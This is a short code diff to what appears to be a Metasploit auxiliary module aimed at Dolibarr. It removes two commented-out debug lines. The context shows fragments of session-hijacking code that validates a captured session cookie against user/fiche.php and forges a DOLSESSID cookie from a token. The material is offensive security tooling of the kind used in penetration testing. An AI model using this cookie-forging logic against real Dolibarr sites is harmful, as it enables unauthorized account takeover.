@@ -101,7 +101,6 @@ class Metasploit3 < Msf::Auxiliary
   # Verify if session cookie is valid and return user's ID
   #
   def get_user_id
-    # print_debug("#{peer} - Trying to hijack session '#{@cookie}'")
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
       'cookie'    => @cookie
@@ -121,7 +120,6 @@ class Metasploit3 < Msf::Auxiliary
   # Construct cookie using token
   #
   def create_cookie(token)
-    # print_debug("#{peer} - Creating a cookie with token '#{token}'")
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
       'cookie'    => "DOLSESSID_#{Rex::Text.rand_text_alphanumeric(10)}=#{token}"
